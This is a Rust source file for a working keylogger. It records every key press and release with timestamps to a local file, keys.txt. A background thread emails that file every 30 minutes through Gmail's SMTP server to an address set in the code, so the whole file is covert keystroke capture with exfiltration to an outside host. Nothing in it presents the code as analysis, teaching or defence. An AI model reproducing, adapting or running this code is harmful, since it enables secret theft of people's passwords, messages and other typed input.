use lazy_static::lazy_static;
use std::sync::{Mutex};
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::time::Duration;
use rdev::{Event, EventType, listen};
use chrono::prelude::*;
use lettre_email::EmailBuilder;
use lettre_email::mime::TEXT_PLAIN;
use lettre::{ClientSecurity, ClientTlsParameters, SmtpClient, SmtpTransport, Transport};
use lettre::smtp::authentication::Credentials;
use lettre::smtp::client::ClientCodec;


const FILENAME: &str = "keys.txt";

struct Mail {
    smpt_server: String,
    smpt_port: u32
}

impl Mail {
    pub fn new() -> Self {
        // GMAIL
        Mail {
            smpt_port: 587u16 as u32,
            smpt_server: String::from("smtp.googlemail.com")
        }
    }
    ///FROM: (username, password)
    ///You might need to enable https://www.google.com/settings/security/lesssecureapps
    ///REFERENCE: https://gist.github.com/gyng/5d60225d55928ab4cf55309c88b25ecf
    pub fn send_email(&self, from: (String, String), to: String) {
        let mime = TEXT_PLAIN;
        let str_path /*gore code, pls ignore*/ = format!("./{}", FILENAME);
        let path = Path::new(&str_path);
        let email = EmailBuilder::new()
            .to(to)
            .from(from.0.clone())
            .subject("KEYLOGGER LOGS")
            .body("KEYLOGGER LOGS")
            .text("here are the logs:")
            .attachment_from_file(path, Some(FILENAME), &mime)
            .unwrap().build().unwrap();
        let mut mailer = SmtpTransport::new(SmtpClient::new_simple(self.smpt_server.as_str()).unwrap().credentials(Credentials::new(from.0, from.1)));
        let a = mailer.send(email.clone().into()).unwrap();
        println!("EMAIL SENT");
    }
}

struct ContentWrapper {
    file: Mutex<File>
}

impl ContentWrapper {
    pub fn new(name: String) -> Self {
        Self {
            file: Mutex::new(OpenOptions::new().create(true).append(true).write(true).open(name).unwrap())
        }
    }
    pub fn write_event(&self, event: Event) {
        let ev_type = match event.event_type {
            EventType::KeyPress(key) => {
                format!("KEYPRESS: {:?}", key)
            },
            EventType::KeyRelease(key) => {
                format!("KEYRELEASE: {:?}", key)
            }
            _ => {
                return;
            }
        };
        let text = format!("[{}] {}\n", Utc::now(), ev_type);
        self.file.lock().unwrap().write(text.as_bytes());
    }
}

lazy_static! {
    static ref file: ContentWrapper = ContentWrapper::new(FILENAME.to_string());
}

fn main() {

    std::thread::spawn(|| {
        let mailer = Mail::new();
        loop {
            mailer.send_email(("youremail@gmail.com".to_string(), "yourpassword".to_string()), "emailtosendlogs@gmail.com".to_string());
            std::thread::sleep(Duration::from_secs(60 * 30));
        }
    });

    if let Err(error) = listen(|e| {
        file.write_event(e);
    }) {
        println!("Error: {:?}", error)
    }
}
